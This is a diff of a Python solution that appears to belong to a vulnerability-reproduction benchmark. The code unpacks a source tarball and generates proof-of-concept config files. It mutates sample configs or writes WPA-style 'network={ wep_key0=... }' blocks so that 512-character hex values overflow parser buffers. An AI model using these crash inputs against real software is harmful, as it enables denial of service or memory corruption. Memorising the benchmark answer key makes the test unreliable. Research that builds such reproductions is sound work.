@@ -5,15 +5,18 @@ import tempfile
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        def extract_tarball(tar_path):
-            tmpdir = tempfile.mkdtemp(prefix="arvopoc_")
+        def extract_tarball(path):
+            if os.path.isdir(path):
+                return path
+            tmpdir = tempfile.mkdtemp(prefix="src_")
             try:
-                with tarfile.open(tar_path, 'r:*') as tf:
+                with tarfile.open(path, "r:*") as tf:
                     def is_within_directory(directory, target):
                         abs_directory = os.path.abspath(directory)
                         abs_target = os.path.abspath(target)
                         prefix = os.path.commonprefix([abs_directory, abs_target])
                         return prefix == abs_directory
+
                     def safe_extract(tar, path=".", members=None, *, numeric_owner=False):
                         for member in tar.getmembers():
                             member_path = os.path.join(path, member.name)
@@ -23,211 +26,154 @@ class Solution:
                     safe_extract(tf, tmpdir)
             except Exception:
                 return None
+            # Flatten single-dir tars
+            try:
+                entries = [e for e in os.listdir(tmpdir) if not e.startswith('.')]
+                if len(entries) == 1:
+                    single = os.path.join(tmpdir, entries[0])
+                    if os.path.isdir(single):
+                        return single
+            except Exception:
+                pass
             return tmpdir
 
-        def read_text(path):
-            try:
-                with open(path, "r", encoding="utf-8", errors="ignore") as f:
-                    return f.read()
-            except Exception:
-                try:
-                    with open(path, "r", encoding="latin-1", errors="ignore") as f:
-                        return f.read()
-                except Exception:
-                    return ""
-
-        def find_candidate_config_files(root):
-            cfg_exts = {".conf", ".cfg", ".ini", ".config", ".cnf", ".toml", ".yaml", ".yml", ".json", ".txt"}
-            candidates = []
-            for dirpath, _, filenames in os.walk(root):
-                ldir = dirpath.lower()
-                # Prioritize likely directories
-                bias = 0
-                if any(tok in ldir for tok in ["example", "sample", "doc", "test", "fuzz", "seed"]):
-                    bias += 2
-                for fn in filenames:
-                    lfn = fn.lower()
-                    _, ext = os.path.splitext(lfn)
-                    score = 0
-                    if ext in cfg_exts:
-                        score += 2
-                    if any(tok in lfn for tok in ["example", "sample", "default", "config", "conf", "seed"]):
-                        score += 1
-                    if "readme" in lfn:
-                        continue
-                    if score > 0:
-                        candidates.append((score + bias, os.path.join(dirpath, fn)))
-            candidates.sort(reverse=True)
-            return [p for _, p in candidates]
-
-        def find_hexish_lines(content):
-            # Identify lines with values that look hex-like
-            lines = content.splitlines()
+        def list_text_files(root):
+            text_exts = ('.c','.h','.cpp','.cc','.hpp','.conf','.cfg','.ini','.toml','.yaml','.yml','.txt','.md','.mk','.def')
             results = []
-            hex_val_pat = re.compile(r'([=:]\s*|\s)\s*(?:"(0x[0-9A-Fa-f]+|#[0-9A-Fa-f]+|[0-9A-Fa-f]{3,})"|\'(0x[0-9A-Fa-f]+|#[0-9A-Fa-f]+|[0-9A-Fa-f]{3,})\'|(0x[0-9A-Fa-f]+|#[0-9A-Fa-f]+|[0-9A-Fa-f]{3,}))')
-            for idx, line in enumerate(lines):
-                if line.strip().startswith(("#", "//", ";")):
-                    continue
-                m = hex_val_pat.search(line)
-                if m:
-                    results.append((idx, line, m))
+            for dirpath, _, filenames in os.walk(root):
+                for fn in filenames:
+                    lower = fn.lower()
+                    if lower.endswith(text_exts) or lower in ('makefile','readme','readme.md'):
+                        full = os.path.join(dirpath, fn)
+                        try:
+                            # limit read to 1.5MB to avoid huge files
+                            with open(full, 'r', errors='ignore') as f:
+                                results.append((full, f.read(1_500_000)))
+                        except Exception:
+                            pass
             return results
 
-        def expand_hex_value_in_line(line, match, target_len=512):
-            # Determine which group holds the hex value
-            groups = match.groups()
-            inner = None
-            quote_char = ""
-            # groups: outer with quotes or none
-            for g in groups[::-1]:
-                if g:
-                    inner = g
-                    break
-            if inner is None:
-                return None
-            # detect quoting
-            before = line[:match.start()]
-            after = line[match.end():]
-            # Determine prefix (# or 0x or none)
-            if inner.startswith(("0x", "0X")):
-                prefix = "0x"
-                base = inner[2:]
-            elif inner.startswith("#"):
-                prefix = "#"
-                base = inner[1:]
+        def detect_wpa(text_files):
+            for _, content in text_files:
+                if any(s in content for s in ('wpa_supplicant', 'hostapd', 'wpa_config', 'wep_key0', 'wep_key1', 'wep_tx_keyidx')):
+                    return True
+            return False
+
+        def find_sample_conf_with_hex(text_files):
+            cand = []
+            for path, content in text_files:
+                base = os.path.basename(path).lower()
+                is_sample = any(k in base for k in ('sample','example','default','config','conf','cfg','settings','ini')) and \
+                            any(base.endswith(ext) for ext in ('.conf','.cfg','.ini','.toml','.yaml','.yml','.txt','.md'))
+                if not is_sample:
+                    continue
+                cand.append((path, content))
+            def find_hex_line(text):
+                for line in text.splitlines():
+                    sline = line.strip()
+                    if not sline or sline.startswith(('#',';','//')):
+                        continue
+                    if re.search(r'0x[0-9a-fA-F]+', sline):
+                        return ('0x', line)
+                    if re.search(r'(=|:)\s*[0-9a-fA-F]{8,}\s*$', sline):
+                        return ('plain', line)
+                    # CSS-like color
+                    if re.search(r'#[0-9a-fA-F]{6,}$', sline):
+                        return ('#', line)
+                return (None, None)
+            for path, content in cand:
+                prefix, line = find_hex_line(content)
+                if line:
+                    return (path, content, prefix, line)
+            return (None, None, None, None)
+
+        def build_from_sample(content, prefix, line, hex_len=512):
+            hx = 'A' * hex_len
+            if prefix == '#':
+                repl_value = '#' + hx
+            elif prefix == '0x':
+                repl_value = '0x' + hx
             else:
-                prefix = ""
-                base = inner
-            # Keep hex digits only
-            base = re.sub(r'[^0-9A-Fa-f]', '', base)
-            if target_len < 64:
-                target_len = 64
-            # Make length even to simulate byte pairs for hex decoding
-            if target_len % 2 == 1:
-                target_len += 1
-            payload_digits = "f" * target_len
-            new_inner = prefix + payload_digits
-            # Assemble
-            new_line = line[:match.start()] + new_inner + line[match.end():]
-            return new_line
+                repl_value = hx
+            out_lines = []
+            for ln in content.splitlines():
+                if ln == line:
+                    if prefix == 'plain':
+                        if '=' in ln:
+                            k, _, _ = ln.partition('=')
+                            out_lines.append(k.rstrip() + '=' + repl_value)
+                        elif ':' in ln:
+                            k, _, _ = ln.partition(':')
+                            out_lines.append(k.rstrip() + ':' + repl_value)
+                        else:
+                            parts = ln.split()
+                            if len(parts) >= 2:
+                                out_lines.append(parts[0] + ' ' + repl_value)
+                            else:
+                                out_lines.append(repl_value)
+                    else:
+                        idx = ln.find(prefix)
+                        if idx >= 0:
+                            out_lines.append(ln[:idx] + repl_value)
+                        else:
+                            out_lines.append(ln)
+                else:
+                    out_lines.append(ln)
+            return ('\n'.join(out_lines) + '\n').encode()
 
-        def modify_config_content(content):
-            # Try to expand the first hexish value; if none found, expand every line that seems hexish
-            hex_lines = find_hexish_lines(content)
-            if not hex_lines:
-                return None
-            lines = content.splitlines()
-            modified = False
-            # Prefer lines with 0x or # explicitly
-            prioritized = []
-            for idx, line, m in hex_lines:
-                val = None
-                for g in m.groups()[::-1]:
-                    if g:
-                        val = g
-                        break
-                explicit = 1 if val and (val.startswith("0x") or val.startswith("#")) else 0
-                prioritized.append((explicit, idx, line, m))
-            prioritized.sort(key=lambda x: (-x[0], x[1]))
-            # Modify the best candidate
-            explicit, idx, line, m = prioritized[0]
-            new_line = expand_hex_value_in_line(line, m, target_len=512)
-            if new_line:
-                lines[idx] = new_line
-                modified = True
-            if not modified:
-                return None
-            # Return joined with trailing newline
-            return ("\n".join(lines) + "\n").encode("utf-8", errors="ignore")
+        def build_wpa_poc(hex_len=512):
+            hx = 'A' * hex_len
+            # Minimal network block: WEP key without quotes forces hex interpretation
+            # Keep it compact to target line-based parsers
+            poc = []
+            poc.append('network={')
+            poc.append('wep_key0=' + hx)
+            poc.append('}')
+            return ('\n'.join(poc) + '\n').encode()
 
-        def search_source_for_keys(root):
-            # Attempt to find potential config keys from source code
-            keys = set()
-            patterns = [
-                re.compile(r'strcmp\s*\(\s*[^,]+,\s*"([A-Za-z0-9_\-\.]+)"\s*\)'),
-                re.compile(r'strncmp\s*\(\s*[^,]+,\s*"([A-Za-z0-9_\-\.]+)"\s*",\s*\d+\s*\)'),
-                re.compile(r'\bkey\s*[:=]\s*"([A-Za-z0-9_\-\.]+)"'),
-                re.compile(r'"([A-Za-z0-9_\-]{2,})"\s*[:=]'),
-            ]
-            for dirpath, _, filenames in os.walk(root):
-                for fn in filenames:
-                    if not any(fn.endswith(ext) for ext in [".c", ".h", ".cpp", ".cc", ".hpp", ".go", ".rs", ".py"]):
-                        continue
-                    text = read_text(os.path.join(dirpath, fn))
-                    if not text:
-                        continue
-                    if "config" not in text and "cfg" not in text and "conf" not in text:
-                        # only scan likely files to save time
-                        pass
-                    for pat in patterns:
-                        for m in pat.finditer(text):
-                            s = m.group(1)
-                            if s:
-                                if len(s) >= 3 and len(s) <= 32:
-                                    keys.add(s)
-            # Prefer keys indicating hex
-            prioritized = []
-            for k in keys:
-                score = 0
-                lk = k.lower()
-                if any(tok in lk for tok in ["hex", "color", "rgb", "rgba", "key", "psk", "salt", "id", "nonce", "hash"]):
-                    score += 2
-                prioritized.append((score, k))
-            prioritized.sort(reverse=True)
-            return [k for _, k in prioritized]
+        def build_generic_poc(hex_len=512):
+            hx = 'A' * hex_len
+            lines = []
+            lines.append('# Generic config with long hex values to trigger overflow')
+            # INI style
+            for key in ('psk','key','wep_key0','ssid','mac','addr','secret','token','color','bgcolor','fgcolor'):
+                lines.append(f'{key}={hx}')
+                lines.append(f'{key}=0x{hx}')
+                lines.append(f'{key}=#{hx}')
+                lines.append(f'{key}: {hx}')
+                lines.append(f'{key} {hx}')
+            # Section style
+            lines.append('[network]')
+            lines.append(f'wep_key0={hx}')
+            lines.append('[settings]')
+            lines.append(f'key=0x{hx}')
+            # Brace style
+            lines.append('network={')
+            lines.append(f'  wep_key0={hx}')
+            lines.append('}')
+            return ('\n'.join(lines) + '\n').encode()
 
-        def build_fallback_payload(keys):
-            # Construct minimal config-like forms using found keys; else generic candidates
-            payload_lines = []
-            hex_payload_len = 512
-            long_hex = "0x" + "f" * hex_payload_len
-            hash_hex = "#" + "f" * hex_payload_len
-            bare_hex = "f" * hex_payload_len
-            # Use most promising keys first
-            used = set()
-            if keys:
-                for k in keys:
-                    lk = k.lower()
-                    if k in used:
-                        continue
-                    if any(tok in lk for tok in ["hex", "color", "rgb", "rgba"]):
-                        payload_lines.append(f"{k} = {hash_hex if 'color' in lk or 'rgb' in lk else long_hex}")
-                        used.add(k)
-                        break
-                for k in keys:
-                    if k in used:
-                        continue
-                    lk = k.lower()
-                    if any(tok in lk for tok in ["key", "psk", "salt", "nonce", "id", "hash"]):
-                        payload_lines.append(f"{k} = {long_hex}")
-                        used.add(k)
-                        if len(payload_lines) >= 2:
-                            break
-            # Always add a generic line
-            if not payload_lines:
-                payload_lines.append(f"hex = {long_hex}")
-            # Keep it short: only up to 3 lines to avoid non-zero exit in fixed
-            payload = "\n".join(payload_lines[:3]) + "\n"
-            return payload.encode("utf-8", errors="ignore")
+        root = extract_tarball(src_path)
+        if not root or not os.path.exists(root):
+            # Fallback: WPA-like minimal PoC
+            return build_wpa_poc(512)
 
-        # Begin processing
-        extracted = extract_tarball(src_path)
-        if not extracted:
-            # Fallback generic payload
-            generic = "hex = 0x" + "f" * 512 + "\n"
-            return generic.encode()
+        text_files = list_text_files(root)
 
-        # Try sample config files first
-        cfg_files = find_candidate_config_files(extracted)
-        for cfg in cfg_files:
-            content = read_text(cfg)
-            if not content:
-                continue
-            modified = modify_config_content(content)
-            if modified:
-                return modified
+        # Prefer sample config mutation if available
+        path, content, prefix, line = find_sample_conf_with_hex(text_files)
+        if content and prefix and line:
+            try:
+                return build_from_sample(content, prefix, line, 512)
+            except Exception:
+                pass
 
-        # If no suitable config samples, try to identify keys from source
-        keys = search_source_for_keys(extracted)
-        # Build fallback payload using guessed keys
-        return build_fallback_payload(keys)
+        # If project looks like wpa_supplicant/hostapd
+        if detect_wpa(text_files):
+            try:
+                return build_wpa_poc(512)
+            except Exception:
+                pass
+
+        # Fallback generic
+        return build_generic_poc(512)
